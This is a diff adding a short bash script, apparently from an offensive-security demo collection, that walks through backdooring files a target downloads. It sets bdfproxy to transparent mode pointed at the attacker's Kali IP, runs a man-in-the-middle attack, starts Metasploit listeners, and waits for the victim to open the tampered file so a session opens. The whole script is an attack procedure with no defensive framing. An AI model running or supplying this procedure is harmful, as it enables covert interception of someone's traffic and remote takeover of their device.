@@ -1,0 +1,20 @@
+#!/bin/bash
+echo "~~Script Description: This script is used to backdoor any file downloaded in the target device."
+echo "~~Attack Procedure:"
+echo "	1-Modify bdfproxy configuration file by by setting the “proxyMode” to “Transparent” and “HOST” to your kali IP."
+echo "	2-Start bdfproxy.
+	3-MITM attack.
+	5-Start Metasploit listeners with the resource file created by bdfproxy..
+	6-GO to the target device, and downlaod any file.
+	7-OPen the file.
+	8-Check metasploit listener for opened sessions."
+leafpad /etc/bdfproxy/bdfproxy.cfg
+cd
+cd Desktop/Scripts/Demo-4-Client-Side-Attacks/
+gnome-terminal --tab -e './bdfproxy-2'
+bdfproxy
+
+
+
+
+
